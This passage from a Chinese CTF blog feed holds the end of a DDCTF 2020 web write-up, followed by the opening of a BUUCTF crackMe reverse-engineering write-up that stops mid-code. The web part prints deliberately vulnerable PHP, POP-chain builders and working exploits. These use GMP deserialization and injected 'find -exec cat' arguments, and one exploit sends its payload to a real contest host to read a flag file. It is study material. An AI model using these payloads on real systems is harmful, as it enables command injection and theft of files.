class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyClass</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$kw0ng</span>;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$flag</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;kw0ng = <span class="hljs-number">1</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_flag</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;find /FlagNeverFall &#x27;</span> . <span class="hljs-title function_ invoke__">escapeshellcmd</span>(<span class="hljs-variable">$this</span>-&gt;flag));<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Prompter</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">protected</span>  <span class="hljs-variable">$hint</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">execute</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$value</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/gopher|http|file|ftp|https|dict|zlib|zip|bzip2|data|glob|phar|ssh2|rar|ogg|expect|\.\.|\.\//i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;hint))<br>        &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Don&#x27;t Do That!&quot;</span>);<br>        &#125;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>(<span class="hljs-variable">$this</span>-&gt;hint);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Display</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$contents</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$page</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span>=<span class="hljs-string">&#x27;/hint/hint.php&#x27;</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;contents = <span class="hljs-variable">$file</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Welcome to DDCTF 2020, Have fun!&lt;br/&gt;&lt;br/&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">contents</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;page-&gt;contents = <span class="hljs-string">&quot;POP me! I can give you some hints!&quot;</span>;<br>        <span class="hljs-keyword">unset</span>(<span class="hljs-variable language_">$this</span>-&gt;page-&gt;cont);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Repeater</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$cont</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$content</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;content = <span class="hljs-keyword">array</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__unset</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$func</span> = <span class="hljs-variable language_">$this</span>-&gt;content;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$func</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Info</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;phpinfo();&#x27;</span>);<br>    &#125;<br><br>&#125;<br><br><span class="hljs-variable">$show</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Display</span>();<br><span class="hljs-variable">$bullet</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;bullet&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$bullet</span>))<br>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Give Me Something!&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$bullet</span> == <span class="hljs-string">&#x27;phpinfo&#x27;</span>)<br>&#123;<br>    <span class="hljs-variable">$infos</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Info</span>();<br>&#125;<span class="hljs-keyword">else</span><br>&#123;<br>    <span class="hljs-variable">$obstacle</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">stdClass</span>;<br>    <span class="hljs-variable">$mc</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyClass</span>();<br>    <span class="hljs-variable">$mc</span>-&gt;flag = <span class="hljs-string">&quot;MyClass&#x27;s flag said, Overwrite Me If You Can!&quot;</span>;<br>    @<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$bullet</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$mc</span>-&gt;<span class="hljs-title function_ invoke__">get_flag</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>转了一圈没啥思路，只能试着读那个hint.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Prompter</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">protected</span>  <span class="hljs-variable">$hint</span>=<span class="hljs-string">&#x27;/hint/hint.php&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">execute</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$value</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/gopher|http|file|ftp|https|dict|zlib|zip|bzip2|data|glob|phar|ssh2|rar|ogg|expect|\.\.|\.\//i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;hint))<br>        &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Don&#x27;t Do That!&quot;</span>);<br>        &#125;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>(<span class="hljs-variable">$this</span>-&gt;hint);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Display</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$contents</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$page</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span>=<span class="hljs-string">&#x27;/hint/hint.php&#x27;</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;contents = <span class="hljs-variable">$file</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Welcome to DDCTF 2020, Have fun!&lt;br/&gt;&lt;br/&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">contents</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;page-&gt;contents = <span class="hljs-string">&quot;POP me! I can give you some hints!&quot;</span>;<br>        <span class="hljs-keyword">unset</span>(<span class="hljs-variable language_">$this</span>-&gt;page-&gt;cont);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Repeater</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$cont</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$content</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;content = <span class="hljs-keyword">array</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__unset</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$func</span> = <span class="hljs-variable language_">$this</span>-&gt;content;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$func</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Info</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;phpinfo();&#x27;</span>);<br>    &#125;<br><br>&#125;<br><br><span class="hljs-variable">$chain1</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Display</span>();<br><span class="hljs-variable">$chain2</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Repeater</span>();<br><span class="hljs-variable">$chain3</span>= <span class="hljs-keyword">new</span> <span class="hljs-title class_">Prompter</span>();<br><br><span class="hljs-comment">//$chain3-&gt;hint = &quot;/hint/hint.php&quot;;</span><br><span class="hljs-variable">$chain2</span>-&gt;content=<span class="hljs-variable">$chain3</span>;<br><span class="hljs-variable">$chain1</span>-&gt;page = <span class="hljs-variable">$chain2</span>;<br><br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$chain1</span>)) ;<br><span class="hljs-comment">//O%3A7%3A%22Display%22%3A2%3A%7Bs%3A8%3A%22contents%22%3Bs%3A14%3A%22%2Fhint%2Fhint.php%22%3Bs%3A4%3A%22page%22%3BO%3A8%3A%22Repeater%22%3A2%3A%7Bs%3A14%3A%22%00Repeater%00cont%22%3BN%3Bs%3A7%3A%22content%22%3BO%3A8%3A%22Prompter%22%3A1%3A%7Bs%3A7%3A%22%00%2A%00hint%22%3Bs%3A10%3A%22.%2Ftest.php%22%3B%7D%7D%7D</span><br></code></pre></td></tr></table></figure><p>然后bullet传进去后显示有个 &#x2F;FlagNeverFall&#x2F;suffix_flag.php，然而最后利用的是一个include函数，就算include了没有highlight_file(<em>_FILE</em>_)等我们依然没有办法拿到内容。</p><p>后面虽然注意到了$kw0ng这个值有些奇怪，以及看起来似乎有用但不知道有啥用的phpinfo ，但依然没有搜索到有价值的信息，无奈看WP</p><p>然后发现 <a href="http://117.51.137.166/hint/hint.php">http://117.51.137.166/hint/hint.php</a> 能直接访问。。。一时语塞 个人感觉是题目出糊了，应该是反序列化读 hint&#x2F;hint.php 来读 flag 的前半部分的（也有可能是干扰项，如果真是这样只能怪自己脑洞太小:) ）</p><p>写到这里时环境关了。。信息只能从WP拿了</p><p>hint.php：<br>Good Job! You’ve got the preffix of the flag: DDCTF{VgQN6HXC2moDAq39And i’ll give a hint, I have already installed the PHP GMP extension, It has a kind of magic in php unserialize, Can you utilize it to get the remaining flag? Go ahead!</p><p>GMP利用相关的参考：<br><a href="https://xz.aliyun.com/t/6781">https://xz.aliyun.com/t/6781</a><br><a href="https://bugs.php.net/bug.php?id=70513">https://bugs.php.net/bug.php?id=70513</a><br><a href="https://paper.seebug.org/1267/">https://paper.seebug.org/1267/</a><br><a href="https://hackerone.com/reports/198734">https://hackerone.com/reports/198734</a></p><p>大致的利用思路就是如果我们有一个可控的反序列化入口，目标后端PHP安装了GMP插件，如果我们找到一个可控的__wakeup魔术方法，我们就可以修改反序列化前声明的对象属性，并配合场景产生实际的安全问题。</p><p>一个可行的exp如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyClass</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$kw0ng</span>;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$flag</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;kw0ng = <span class="hljs-number">1</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_flag</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$this</span>-&gt;flag);<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;find /FlagNeverFall &#x27;</span> . <span class="hljs-title function_ invoke__">escapeshellcmd</span>(<span class="hljs-variable">$this</span>-&gt;flag));<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Display</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$contents</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$page</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span>=<span class="hljs-string">&#x27;/hint/hint.php&#x27;</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;contents = <span class="hljs-variable">$file</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Welcome to DDCTF 2020, Have fun!&lt;br/&gt;&lt;br/&gt;\n&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">contents</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;page-&gt;contents = <span class="hljs-string">&quot;POP me! I can give you some hints!&quot;</span>;<br>        <span class="hljs-keyword">unset</span>(<span class="hljs-variable language_">$this</span>-&gt;page-&gt;cont);<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$show</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Display</span>();<br><span class="hljs-variable">$obstacle</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">stdClass</span>;<br><span class="hljs-variable">$mc</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyClass</span>();<br><span class="hljs-variable">$mc</span>-&gt;flag = <span class="hljs-string">&quot;MyClass&#x27;s flag said, Overwrite Me If You Can!&quot;</span>;<br><span class="hljs-variable">$inner</span> = <span class="hljs-string">&#x27;s:1:&quot;3&quot;;a:2:&#123;s:4:&quot;flag&quot;;s:63:&quot;-iname sth -or -exec cat /FlagNeverFall/suffix_flag.php ; -quit&quot;;i:1;O:12:&quot;DateInterval&quot;:1:&#123;s:1:&quot;y&quot;;R:2;&#125;&#125;&#125;&#x27;</span>;<br><span class="hljs-variable">$exploit</span> = <span class="hljs-string">&#x27;a:1:&#123;i:0;C:3:&quot;GMP&quot;:&#x27;</span>.<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$inner</span>).<span class="hljs-string">&#x27;:&#123;&#x27;</span>.<span class="hljs-variable">$inner</span>.<span class="hljs-string">&#x27;&#125;&#125;i:1;O:7:&quot;MyClass&quot;:1:&#123;s:5:&quot;kw0ng&quot;;R:3;&#125;&#125;&#x27;</span>;<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$exploit</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$mc</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$mc</span>-&gt;<span class="hljs-title function_ invoke__">get_flag</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$exploit</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这里WP的师傅说不用 GMP 也能打，这里没太看懂啥意思，Mark一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyClass</span> </span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$kw0ng</span>;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$flag</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HintClass</span> </span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$hint</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ShowOff</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$contents</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$page</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MiddleMan</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$content</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$cont</span>;<br>&#125;<br><br><br><span class="hljs-variable">$showoff</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ShowOff</span>();<br><span class="hljs-variable">$myclass</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyClass</span>();<br><span class="hljs-variable">$myclass</span>-&gt;flag = <span class="hljs-string">&#x27;-exec cat /flag &#123;&#125; ;&#x27;</span>;<br><span class="hljs-variable">$showoff</span>-&gt;page = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MiddleMan</span>();<br><span class="hljs-variable">$showoff</span>-&gt;page-&gt;content = [<span class="hljs-variable">$myclass</span>, <span class="hljs-string">&#x27;get_flag&#x27;</span>];<br><br><span class="hljs-variable">$paylod</span> = <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$showoff</span>));<br><span class="hljs-variable">$url</span> = <span class="hljs-string">&#x27;http://117.51.137.166/atkPWsr2x3omRZFi.php?bullet=&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$url</span> . <span class="hljs-variable">$paylod</span>);<br></code></pre></td></tr></table></figure><h1 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h1><p>这次比赛考的点还是比较新颖的。比如Web和Re结合的Web签到题。。<br>还有就是不太常见的Go语言这回被拿来出题了，看来还是啥都要会一点<br>好多题都卡在最后一步可能还是思路还不够广的原因吧，之后还是要多刷点题</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>实战总结</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>提权</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF RE crackMe WP 详细解析</title>
    <link href="/2020/08/02/writeup/BUUCTF%20RE%20crackMe%20WP%20%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/"/>
    <url>/2020/08/02/writeup/BUUCTF%20RE%20crackMe%20WP%20%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<p>前前后后参考了几篇博文，感觉自己有些值得分享的东西，就有了这篇文章</p><p>题目地址：<br><a href="https://buuoj.cn/challenges#crackMe">https://buuoj.cn/challenges#crackMe</a></p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/BUUCTF%20RE%20crackMe%20WP%20%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90.assets/20200831162628845.png" alt="在这里插入图片描述"></p><p>首先，国际惯例，查壳</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/BUUCTF%20RE%20crackMe%20WP%20%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90.assets/2020083116275520.png" alt="在这里插入图片描述"></p><p>没壳，拖进IDA里通过String定位到关键代码：</p><p>首先是主函数代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">wmain</span><span class="hljs-params">()</span><br>&#123;<br>  FILE *v0; <span 